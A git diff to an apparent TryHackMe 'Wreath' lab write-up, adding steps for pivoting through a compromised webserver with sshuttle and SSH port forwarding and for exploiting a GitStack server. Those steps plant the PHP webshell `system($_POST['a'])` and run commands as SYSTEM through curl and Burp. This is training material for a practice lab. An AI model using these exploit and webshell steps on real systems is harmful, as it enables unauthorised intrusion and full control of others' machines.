@@ -1092,11 +1092,23 @@ client_loop: send disconnect: Broken pipe
 client: fatal: server died with error code 255
 ```
 
+```
+kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24
+c : Connected to server.
+client_loop: send disconnect: Broken pipe
+c : fatal: ssh connection to server (pid 38010) exited with returncode 255
+```
+
 ie. connecting to `172.16.0.5` and forward `172.16.0.0/24`. Including compromised server inside the newly forwarded subnet
 
 We can get around this with `-x` to create connection without disrupting itself
 
 eg. `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
+
+```
+kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
+c : Connected to server.
+```
 
 </details>
 
@@ -1284,6 +1296,8 @@ Check what version python this would run on with `print` statements (`print()` f
 
 Change the ip address to `localhost:8000` (ssh port forward method)
 
+Change the ip address to target IP eg `10.200.85.150` (sshuttle method)
+
 ```python
 ip = 'localhost:8000'
 
@@ -1312,5 +1326,179 @@ print r.text.encode(sys.stdout.encoding, errors='replace')
 These create PHP webshell `<?php system($_POST['a']); ?>` and echo it into `exploit.php` under webroot.
 
 This can be accessed by posting a command to `/web/exploit.php`
+
+</details>
+
+## 16. Git Server - Exploitation
+
+<details>
+  <summary>---</summary>
+
+> Note: For port forwarding method we use target: `localhost:8000`
+> 
+> Note: For sshuttle method we use target: `gitserver.thm`
+
+### sshuttle method
+
+First add `gitserver.thm` to `/etc/hosts`
+
+```
+kali@kali:~/thm/wreath$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+10.200.85.200   thomaswreath.thm
+10.200.85.150   gitserver.thm
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+```
+
+Start a sshuttle connection
+```
+kali@kali:~/thm/wreath$ sshuttle -r root@10.200.85.200 --ssh-cmd "ssh -i ssh/webserver_id_rsa" 10.200.85.0/24 -x 10.200.85.200
+c : Connected to server.
+```
+
+Run `43777.py` exploit with ip value of `10.200.85.150` - this exploit will live in `IP/web/exploit-Neozer0.php`
+
+```
+kali@kali:~/thm/wreath$ python2 43777.py 
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+[+] Execute command
+"nt authority\system
+" 
+```
+
+Two options for reverse shell:
+1. Change the command from `whoami` inside the exploit file but we need to run the exploit every time
+2. Leverage same webshell to execute more commands without performing exploit twice 
+
+We choose option 2 as it is quieter 
+
+Webshell uploaded responds to POST request with param `a`. So we can do a curl - `curl -X POST http://IP/web/exploit.php -d "a=COMMAND"`
+
+```
+kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=whoami"
+"nt authority\system
+" 
+```
+
+Instead of curl we can also use burp proxy
+
+1. Do a GET request to `http://gitserver.thm`
+2. Intercept and send to repeater
+3. Change method to a POST
+4. Add `Content-Type: application/x-www-form-urlencoded`
+5. Add `a=COMMAND`
+
+![burp webshell command](burp-webshell.png)
+
+Find hostname - `git-serv`
+```
+kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=hostname"
+"git-serv
+" 
+```
+
+OS 
+```
+kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=systeminfo"
+"
+Host Name:                 GIT-SERV
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-70000-00000-AA368
+Original Install Date:     08/11/2020, 13:19:49
+System Boot Time:          17/04/2021, 01:06:51
+System Manufacturer:       Xen
+System Model:              HVM domU
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
+BIOS Version:              Xen 4.2.amazon, 24/08/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-gb;English (United Kingdom)
+Input Locale:              en-gb;English (United Kingdom)
+Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
+Total Physical Memory:     2,048 MB
+Available Physical Memory: 1,381 MB
+Virtual Memory: Max Size:  2,432 MB
+Virtual Memory: Available: 1,876 MB
+Virtual Memory: In Use:    556 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 5 Hotfix(s) Installed.
+                           [01]: KB4580422
+                           [02]: KB4512577
+                           [03]: KB4580325
+                           [04]: KB4587735
+                           [05]: KB4592440
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: AWS PV Network Device
+                                 Connection Name: Ethernet
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     10.200.85.1
+                                 IP address(es)
+                                 [01]: 10.200.85.150
+                                 [02]: fe80::24c6:6f4d:2503:aaa2
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+" 
+```
+
+
+### Port forward method
+
+We first run a port forward
+
+Attacking box
+```
+kali@kali:~/thm/wreath$ ssh -i ssh/webserver_id_rsa -L 8000:10.200.85.150:80 root@10.200.85.200 -fN
+```
+
+Modify `43777.py` file with ip of `localhost:8000`
+
+Then we run exploit which executes `whoami` which returns `NT AUTHORITY\SYSTEM` - highest ranking local account on Windows
+
+```
+kali@kali:~/thm/wreath$ python2 43777.py 
+[+] Get user list
+[+] Found user twreath
+[+] Web repository already enabled
+[+] Get repositories list
+[+] Found repository Website
+[+] Add user to repository
+[+] Disable access for anyone
+[+] Create backdoor in PHP
+Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
+[+] Execute command
+"nt authority\system
+" 
+```
+
+We can use curl to run commands (or burp)
+```
+kali@kali:~/thm/wreath$ curl -X POST http://localhost:8000/web/exploit-Neozer0.php -d "a=whoami"
+"nt authority\system
+" 
+```
+
 
 </details>
